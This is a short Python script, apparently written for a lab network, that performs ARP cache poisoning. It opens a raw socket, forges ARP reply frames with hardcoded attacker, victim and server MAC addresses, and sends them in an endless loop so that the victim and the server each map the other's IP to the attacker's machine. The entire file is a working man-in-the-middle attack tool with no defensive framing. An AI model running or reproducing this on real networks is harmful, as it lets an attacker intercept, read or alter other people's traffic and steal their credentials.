import socket
import struct
import binascii
import sys

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket. ntohs(0x0800))
s.bind(("enp0s3",socket.htons(0x0800)))

attckrmac = '\x08\x00\x27\x6a\x6f\x3a'
victimmac ='\x08\x00\x27\x1b\x0f\x7c'
servermac = '\x08\x00\x27\x5b\x5d\x7c'
gatewaymac = '\x0c\x80\x63\xe9\xed\x44'

code ='\x08\x06'

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'

ethernet1 = victimmac + attckrmac + code
ethernet2 = gatewaymac +  attckrmac + code
ethernet3 = servermac + attckrmac + code

#gateway_ip = sys.argv[1] 		#192.168.0.1
victim_ip = sys.argv[1]			#192.168.0.122
server_ip = sys.argv[2]			#192.168.0.124

serverip = socket.inet_aton ( server_ip )
victimip = socket.inet_aton ( victim_ip )

victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attckrmac + serverip + victimmac + victimip
server_ARP = ethernet3 + htype + protype + hsize + psize + opcode + attckrmac + victimip + servermac + serverip

while 1:
   s.send(victim_ARP)
   s.send(server_ARP)

#print(victim_ip)
#print(gateway_ip)

#print(str(victimmac))
#print(str(gatewaymac))


